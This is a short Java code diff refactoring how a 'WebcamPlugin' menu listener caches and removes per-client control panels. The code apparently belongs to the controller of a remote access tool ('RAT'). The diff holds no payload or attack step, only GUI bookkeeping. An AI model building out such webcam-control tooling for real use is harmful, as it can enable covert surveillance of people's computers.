@@ -19,13 +19,11 @@ public class MenuListener implements RATMenuItemActionListener {
 		try {
 			if (servers.size() > 0) {
 				final Client client = servers.get(0);
-				BaseControlPanel panel = null;
+				BaseControlPanel panel = WebcamPlugin.entry.get(client);
 						 
-				if (WebcamPlugin.entry.getInstances().containsKey(client)) {
-					panel = WebcamPlugin.entry.getInstances().get(client);
-				} else {
+				if (panel == null) {
 					panel = WebcamPlugin.entry.newPanelInstance(client);
-					WebcamPlugin.entry.getInstances().put(client, panel);
+					WebcamPlugin.entry.put(client, panel);
 				}
 
 				final BaseControlPanel finalPanel = panel;
@@ -34,7 +32,7 @@ public class MenuListener implements RATMenuItemActionListener {
 				frame.addWindowListener(new WindowAdapter() {
 					@Override
 					public void windowClosing(WindowEvent arg0) {
-						WebcamPlugin.entry.getInstances().remove(client);
+						WebcamPlugin.entry.remove(client);
 						finalPanel.onClose();
 					}
 				});
